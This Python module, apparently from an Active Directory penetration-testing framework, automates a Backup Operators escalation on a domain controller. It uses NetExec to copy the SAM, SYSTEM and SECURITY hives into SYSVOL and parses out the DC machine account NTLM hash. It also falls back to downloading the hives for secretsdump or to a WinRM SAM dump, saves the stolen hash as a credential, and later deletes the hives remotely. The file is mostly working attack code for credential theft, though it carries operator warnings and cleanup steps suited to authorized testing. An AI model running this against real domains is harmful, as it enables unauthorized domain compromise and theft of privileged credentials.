"""Backup Operators escalation via NetExec backup_operator module."""

from __future__ import annotations

import os
import sys
import re
from datetime import datetime, timezone
from typing import Any

from rich.prompt import Confirm

from adscan_internal import print_error, print_info_debug, print_warning
from adscan_internal.rich_output import (
    mark_sensitive,
    print_operation_header,
    print_panel,
)
from adscan_internal.text_utils import strip_ansi_codes
from adscan_internal import telemetry
from adscan_internal.integrations.netexec.parsers import (
    parse_netexec_sysvol_listing,
)
from adscan_internal.integrations.netexec.shares import (
    download_share_files,
    list_share_directory,
)
from adscan_internal.services.attack_graph_runtime_service import (
    update_active_step_status,
)
from adscan_internal.services.attack_graph_service import (
    update_edge_status_by_labels,
)
from adscan_internal.workspaces import domain_subpath

_EMPTY_NTLM_HASH = "31d6cfe0d16ae931b73c59d7e0c089c0"
_MACHINE_HASH_RE = re.compile(r"\$MACHINE\.ACC:\s*[0-9a-fA-F]{32}:([0-9a-fA-F]{32})")
_HOSTNAME_RE = re.compile(r"\\(name:([A-Za-z0-9_.-]+)\\)", re.IGNORECASE)
_SYSVOL_ARTIFACT_RE = re.compile(
    r"\\\\[\\w\\.-]+\\\\SYSVOL\\\\(SAM|SYSTEM|SECURITY)", re.IGNORECASE
)
_SYSVOL_FILES = (
    "C:\\\\Windows\\\\sysvol\\\\sysvol\\\\SAM",
    "C:\\\\Windows\\\\sysvol\\\\sysvol\\\\SYSTEM",
    "C:\\\\Windows\\\\sysvol\\\\sysvol\\\\SECURITY",
)

_SYSVOL_SHARE_FILES = ("SAM", "SYSTEM", "SECURITY")
_BACKUP_OPS_RELATION = "backup_operator"
_BACKUP_OPS_GROUP_LABEL = "Backup Operators"
_BACKUP_OPS_DA_RELATION = "DumpRegistries"
_DOMAIN_ADMINS_LABEL = "Domain Admins"


def _extract_dc_hostname(output: str) -> str | None:
    match = _HOSTNAME_RE.search(output)
    if match:
        return match.group(2).strip()
    return None


def _extract_machine_nt_hash(output: str) -> str | None:
    for line in output.splitlines():
        match = _MACHINE_HASH_RE.search(line)
        if match:
            nt_hash = match.group(1).strip()
            if nt_hash and nt_hash.lower() != _EMPTY_NTLM_HASH:
                return nt_hash
    return None


def _should_mark_sysvol_cleanup(output: str) -> bool:
    return bool(_SYSVOL_ARTIFACT_RE.search(output or ""))


def _mark_sysvol_cleanup_pending(
    shell: Any, *, domain: str, pdc: str, hostname: str | None
) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    domain_entry["backup_ops_sysvol_cleanup_pending"] = {
        "pdc": pdc,
        "hostname": hostname,
        "paths": list(_SYSVOL_FILES),
    }
    shell.domains_data[domain] = domain_entry
    marked_domain = mark_sensitive(domain, "domain")
    print_info_debug(
        f"[backup-ops] SYSVOL cleanup marked as pending for {marked_domain}."
    )
    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()  # type: ignore[attr-defined]
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Failed to persist SYSVOL cleanup state.")


def _mark_backup_ops_attempted(
    shell: Any, *, domain: str, username: str, pdc: str, hostname: str | None
) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    domain_entry["backup_ops_attempted"] = {
        "username": username,
        "pdc": pdc,
        "hostname": hostname,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    shell.domains_data[domain] = domain_entry
    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username, "user")
    print_info_debug(
        "[backup-ops] Escalation attempt recorded for "
        f"{marked_domain} (user={marked_user})."
    )
    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()  # type: ignore[attr-defined]
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Failed to persist Backup Operators attempt state.")


def _mark_backup_ops_success(
    shell: Any, *, domain: str, username: str, pdc: str, hostname: str | None
) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    domain_entry["backup_ops_success"] = {
        "username": username,
        "pdc": pdc,
        "hostname": hostname,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    shell.domains_data[domain] = domain_entry
    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username, "user")
    print_info_debug(
        "[backup-ops] Escalation success recorded for "
        f"{marked_domain} (user={marked_user})."
    )
    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()  # type: ignore[attr-defined]
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Failed to persist Backup Operators success state.")


def _update_backup_ops_da_edge(
    shell: Any,
    *,
    domain: str,
    status: str,
    notes: dict[str, object] | None = None,
) -> None:
    update_edge_status_by_labels(
        shell,
        domain,
        from_label=_BACKUP_OPS_GROUP_LABEL,
        relation=_BACKUP_OPS_DA_RELATION,
        to_label=_DOMAIN_ADMINS_LABEL,
        status=status,
        notes=notes,
    )


def record_backup_ops_discovered(shell: Any, *, domain: str, username: str) -> None:
    _update_backup_ops_da_edge(
        shell,
        domain=domain,
        status="discovered",
        notes={"action": _BACKUP_OPS_DA_RELATION},
    )


def _clear_sysvol_cleanup_pending(shell: Any, *, domain: str) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    if "backup_ops_sysvol_cleanup_pending" not in domain_entry:
        return
    domain_entry.pop("backup_ops_sysvol_cleanup_pending", None)
    shell.domains_data[domain] = domain_entry
    marked_domain = mark_sensitive(domain, "domain")
    print_info_debug(f"[backup-ops] SYSVOL cleanup cleared for {marked_domain}.")
    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()  # type: ignore[attr-defined]
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Failed to persist SYSVOL cleanup state.")


def handle_backup_ops_sysvol_cleanup(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    if not (
        domain_entry.get("backup_ops_attempted")
        or domain_entry.get("backup_ops_success")
        or domain_entry.get("backup_ops_sysvol_cleanup_pending")
    ):
        return
    pending = domain_entry.get("backup_ops_sysvol_cleanup_pending")
    pdc = (pending or {}).get("pdc") if isinstance(pending, dict) else None
    hostname = (pending or {}).get("hostname") if isinstance(pending, dict) else None
    pdc = pdc or domain_entry.get("pdc")
    hostname = hostname or domain_entry.get("pdc_hostname")
    if not pdc:
        return

    marked_domain = mark_sensitive(domain, "domain")
    marked_host = mark_sensitive(str(hostname or pdc), "hostname")
    share_listing = list_share_directory(
        shell,
        domain=domain,
        host=str(pdc),
        auth=shell.build_auth_nxc(username, password, domain, kerberos=True),
        share="SYSVOL",
        directory=None,
    )
    sysvol_files = [
        entry.path
        for entry in share_listing.entries
        if entry.path.upper() in _SYSVOL_SHARE_FILES
    ]
    if not sysvol_files:
        _clear_sysvol_cleanup_pending(shell, domain=domain)
        return

    print_panel(
        "\n".join(
            [
                "⚠️  SYSVOL cleanup required",
                f"Domain: {marked_domain}",
                f"Host: {marked_host}",
                "Detected SAM/SYSTEM/SECURITY in SYSVOL.",
                "These files are readable by all domain users until removed.",
            ]
        ),
        title="[bold yellow]Critical Cleanup[/bold yellow]",
        border_style="yellow",
        expand=False,
    )
    if not Confirm.ask("Remove SYSVOL artifacts now?", default=True):
        print_warning(
            "SYSVOL cleanup skipped. Please remove SAM/SYSTEM/SECURITY from SYSVOL manually."
        )
        return

    if not getattr(shell, "netexec_path", None):
        print_warning("NetExec not available; cannot execute cleanup command.")
        return

    auth = shell.build_auth_nxc(username, password, domain, kerberos=True)
    delete_cmd = (
        "del C:\\Windows\\sysvol\\sysvol\\SECURITY && "
        "del C:\\Windows\\sysvol\\sysvol\\SAM && "
        "del C:\\Windows\\sysvol\\sysvol\\SYSTEM"
    )
    from adscan_internal.integrations.netexec.exec import (
        run_netexec_remote_command,
    )

    exec_result = run_netexec_remote_command(
        shell,
        domain=domain,
        host=str(pdc),
        auth=auth,
        remote_command=delete_cmd,
        service="smb",
        timeout=300,
    )
    exec_status = exec_result.status
    if exec_status.executed:
        print_info_debug(
            f"[backup-ops] SYSVOL cleanup executed via {exec_status.method or 'unknown'}."
        )

    verify_result = run_netexec_remote_command(
        shell,
        domain=domain,
        host=str(pdc),
        auth=auth,
        remote_command="dir C:\\Windows\\sysvol\\sysvol",
        service="smb",
        timeout=300,
    )
    verify_output = verify_result.command_output or verify_result.output
    remaining = parse_netexec_sysvol_listing(verify_output)
    if remaining:
        print_warning(
            "SYSVOL artifacts still present after cleanup attempt. "
            "Please remove them manually."
        )
        print_info_debug(
            "[backup-ops] SYSVOL cleanup verification found remaining files: "
            + ", ".join(remaining)
        )
        print_panel(
            "\n".join(
                [
                    "❗ SYSVOL cleanup failed",
                    f"Domain: {marked_domain}",
                    f"Host: {marked_host}",
                    "Sensitive hives are still present in SYSVOL.",
                    "Stop now and clean them manually to avoid exposure.",
                ]
            ),
            title="[bold red]Cleanup Required[/bold red]",
            border_style="red",
            expand=False,
        )
        if Confirm.ask(
            "Stop execution now to clean SYSVOL manually?",
            default=True,
        ):
            print_warning("Stopping execution for manual SYSVOL cleanup.")
            sys.exit(1)
        return

    _clear_sysvol_cleanup_pending(shell, domain=domain)
    print_panel(
        "\n".join(
            [
                "✅ SYSVOL cleanup completed",
                f"Domain: {marked_domain}",
                f"Host: {marked_host}",
                "SAM/SYSTEM/SECURITY removed from SYSVOL.",
            ]
        ),
        title="[bold green]Cleanup Complete[/bold green]",
        border_style="green",
        expand=False,
    )


def _fallback_winrm_dump(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
) -> None:
    marked_domain = mark_sensitive(domain, "domain")
    marked_host = mark_sensitive(host, "hostname")
    winrm_log = f"domains/{domain}/winrm/dump_{host}_sam.txt"
    marked_log = mark_sensitive(winrm_log, "path")
    print_panel(
        "\n".join(
            [
                "⚠️  SMB module did not yield a usable DC hash",
                f"Fallback: WinRM SAM dump on {marked_host}",
                f"Log file: {marked_log}",
            ]
        ),
        title="[bold yellow]Backup Operators Fallback[/bold yellow]",
        border_style="yellow",
        expand=False,
    )
    print_info_debug(f"[backup-ops] WinRM fallback log path: {marked_log}")
    print_warning(
        "Backup Operators SMB module failed. Falling back to WinRM SAM dump on "
        f"{marked_host} in {marked_domain}."
    )
    try:
        shell.dump_sam_winrm(domain, username, password, host)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Backup Operators WinRM fallback failed.")


def offer_backup_operators_escalation(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> bool:
    """Attempt Backup Operators escalation via NetExec module.

    Returns:
        bool: True if we extracted a machine account NTLM hash and invoked
        add_credential, False otherwise.
    """
    try:
        pdc_ip = shell.domains_data.get(domain, {}).get("pdc")
        if not pdc_ip:
            print_error("Backup Operators escalation requires a PDC IP.")
            update_active_step_status(
                shell,
                domain=domain,
                status="failed",
                notes={"reason": "missing_pdc"},
            )
            return False

        if not getattr(shell, "netexec_path", None):
            print_error("NetExec is not configured; cannot run backup_operator module.")
            update_active_step_status(
                shell,
                domain=domain,
                status="failed",
                notes={"reason": "netexec_missing"},
            )
            return False

        marked_domain = mark_sensitive(domain, "domain")
        marked_pdc = mark_sensitive(pdc_ip, "ip")

        print_operation_header(
            "Backup Operators Escalation",
            details={
                "Domain": domain,
                "User": username,
                "PDC": pdc_ip,
                "Module": "backup_operator",
            },
            icon="🧰",
        )

        if not getattr(shell, "auto", False):
            marked_domain = mark_sensitive(domain, "domain")
            marked_pdc = mark_sensitive(pdc_ip, "ip")
            print_panel(
                "\n".join(
                    [
                        "⚠️  This escalation will copy sensitive hives to SYSVOL",
                        f"Domain: {marked_domain}",
                        f"PDC: {marked_pdc}",
                        "It will dump SYSTEM/SAM/SECURITY to SYSVOL, download them,",
                        "and parse for the DC machine account hash.",
                        "",
                        "If the exploit fails, the hives may remain in SYSVOL.",
                        "In production, ensure they are cleaned up immediately.",
                    ]
                ),
                title="[bold yellow]Backup Operators Warning[/bold yellow]",
                border_style="yellow",
                expand=False,
            )
            if not Confirm.ask(
                "Proceed with Backup Operators escalation?",
                default=True,
            ):
                print_warning("Backup Operators escalation skipped by user.")
                _update_backup_ops_da_edge(
                    shell,
                    domain=domain,
                    status="discovered",
                    notes={"action": _BACKUP_OPS_DA_RELATION, "skipped": True},
                )
                return False

        _mark_backup_ops_attempted(
            shell,
            domain=domain,
            username=username,
            pdc=pdc_ip,
            hostname=shell.domains_data.get(domain, {}).get("pdc_hostname"),
        )
        _update_backup_ops_da_edge(
            shell,
            domain=domain,
            status="attempted",
            notes={"action": _BACKUP_OPS_DA_RELATION},
        )
        update_active_step_status(
            shell,
            domain=domain,
            status="attempted",
            notes={"action": "backup_operator"},
        )

        auth = shell.build_auth_nxc(username, password, domain, kerberos=True)
        auth_log = re.sub(r"(\\s-p\\s+)'[^']*'", r"\\1'[REDACTED]'", auth)
        auth_log = re.sub(r"(\\s-H\\s+)\\S+", r"\\1[REDACTED]", auth_log)
        command = f"{shell.netexec_path} smb {pdc_ip} {auth} -t 1 -M backup_operator"
        command_log = (
            f"{shell.netexec_path} smb {marked_pdc} {auth_log} -t 1 -M backup_operator"
        )
        print_info_debug(f"[backup-ops] Command: {command_log}")

        completed = shell._run_netexec(command, domain=domain, timeout=300)
        if not completed:
            print_error("Backup Operators escalation failed to execute.")
            _update_backup_ops_da_edge(
                shell,
                domain=domain,
                status="failed",
                notes={"reason": "netexec_failed"},
            )
            update_active_step_status(
                shell,
                domain=domain,
                status="failed",
                notes={"reason": "netexec_failed"},
            )
            host = shell.domains_data.get(domain, {}).get("pdc_hostname") or pdc_ip
            _fallback_winrm_dump(
                shell,
                domain=domain,
                username=username,
                password=password,
                host=host,
            )
            return False

        output = strip_ansi_codes(
            (completed.stdout or "") + "\n" + (completed.stderr or "")
        )
        print_info_debug(
            "[backup-ops] Module output collected "
            f"(stdout_len={len(completed.stdout or '')}, stderr_len={len(completed.stderr or '')})."
        )

        dc_hostname = shell.domains_data.get(domain, {}).get(
            "pdc_hostname"
        ) or _extract_dc_hostname(output)
        if not dc_hostname:
            print_warning(
                f"Could not determine DC hostname for {marked_domain}; "
                "machine account hash will be skipped."
            )
        else:
            print_info_debug(f"[backup-ops] Parsed DC hostname: {dc_hostname}")

        nt_hash = _extract_machine_nt_hash(output)
        if not nt_hash:
            print_warning(
                "Backup Operators module did not return a usable machine NTLM hash."
            )
            _update_backup_ops_da_edge(
                shell,
                domain=domain,
                status="failed",
                notes={"reason": "no_machine_hash"},
            )
            update_active_step_status(
                shell,
                domain=domain,
                status="failed",
                notes={"reason": "no_machine_hash"},
            )
            if "ERROR_ALREADY_EXISTS" in output:
                print_info_debug(
                    "[backup-ops] Detected SYSVOL files already present; listing SYSVOL."
                )
                share_listing = list_share_directory(
                    shell,
                    domain=domain,
                    host=pdc_ip,
                    auth=shell.build_auth_nxc(
                        username, password, domain, kerberos=True
                    ),
                    share="SYSVOL",
                    directory=None,
                )
                files = [
                    entry.path
                    for entry in share_listing.entries
                    if entry.path.upper() in _SYSVOL_SHARE_FILES
                ]
                if files:
                    workspace_cwd = (
                        shell._get_workspace_cwd()  # type: ignore[attr-defined]
                        if hasattr(shell, "_get_workspace_cwd")
                        else getattr(shell, "current_workspace_dir", os.getcwd())
                    )
                    output_dir = domain_subpath(
                        workspace_cwd,
                        getattr(shell, "domains_dir", "domains"),
                        domain,
                        "smb",
                        "sysvol_hives",
                    )
                    downloaded = download_share_files(
                        shell,
                        domain=domain,
                        host=pdc_ip,
                        auth=shell.build_auth_nxc(
                            username, password, domain, kerberos=True
                        ),
                        share="SYSVOL",
                        files=files,
                        output_dir=output_dir,
                    )
                    empty_files = [
                        path
                        for path in downloaded
                        if os.path.exists(path) and os.path.getsize(path) == 0
                    ]
                    if empty_files:
                        marked_domain = mark_sensitive(domain, "domain")
                        print_warning(
                            f"Downloaded SYSVOL hive(s) were empty in {marked_domain}. "
                            "Skipping empty files."
                        )
                        print_info_debug(
                            "[backup-ops] Empty SYSVOL hives: " + ", ".join(empty_files)
                        )
                    downloaded = [
                        path
                        for path in downloaded
                        if os.path.exists(path) and os.path.getsize(path) > 0
                    ]
                    sam_path = next(
                        (path for path in downloaded if path.upper().endswith("SAM")),
                        None,
                    )
                    system_path = next(
                        (
                            path
                            for path in downloaded
                            if path.upper().endswith("SYSTEM")
                        ),
                        None,
                    )
                    if sam_path and system_path:
                        print_info_debug(
                            "[backup-ops] Downloaded SYSVOL hives; running secretsdump."
                        )
                        from adscan_internal.cli.dumps import run_secretsdump_registries

                        run_secretsdump_registries(
                            shell,
                            domain=domain,
                            sam_path=sam_path,
                            system_path=system_path,
                        )
            host = shell.domains_data.get(domain, {}).get("pdc_hostname") or pdc_ip
            _fallback_winrm_dump(
                shell,
                domain=domain,
                username=username,
                password=password,
                host=host,
            )
            return False

        if _should_mark_sysvol_cleanup(output):
            _mark_sysvol_cleanup_pending(
                shell,
                domain=domain,
                pdc=pdc_ip,
                hostname=dc_hostname,
            )

        if not dc_hostname:
            _update_backup_ops_da_edge(
                shell,
                domain=domain,
                status="failed",
                notes={"reason": "dc_hostname_missing"},
            )
            update_active_step_status(
                shell,
                domain=domain,
                status="failed",
                notes={"reason": "dc_hostname_missing"},
            )
            return False

        _mark_backup_ops_success(
            shell,
            domain=domain,
            username=username,
            pdc=pdc_ip,
            hostname=dc_hostname,
        )
        _update_backup_ops_da_edge(
            shell,
            domain=domain,
            status="success",
            notes={"action": _BACKUP_OPS_DA_RELATION},
        )
        update_active_step_status(
            shell,
            domain=domain,
            status="success",
            notes={"action": "backup_operator"},
        )

        machine_account = f"{dc_hostname.upper()}$"
        marked_machine = mark_sensitive(machine_account, "user")
        marked_hash = mark_sensitive(nt_hash, "password")
        print_panel(
            "\n".join(
                [
                    "✅ Backup Operators module completed",
                    f"Domain: {marked_domain}",
                    f"DC Account: {marked_machine}",
                    f"NTLM Hash: {marked_hash}",
                    "Action: Saving credential and validating access",
                ]
            ),
            title="[bold green]Backup Operators Result[/bold green]",
            border_style="green",
            expand=False,
        )

        shell.add_credential(
            domain,
            machine_account,
            nt_hash,
            prompt_for_user_privs_after=True,
        )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Backup Operators escalation encountered an error.")
        _update_backup_ops_da_edge(
            shell,
            domain=domain,
            status="failed",
            notes={"reason": "exception"},
        )
        update_active_step_status(
            shell,
            domain=domain,
            status="failed",
            notes={"reason": "exception"},
        )
        return False


__all__ = [
    "record_backup_ops_discovered",
    "offer_backup_operators_escalation",
    "handle_backup_ops_sysvol_cleanup",
]
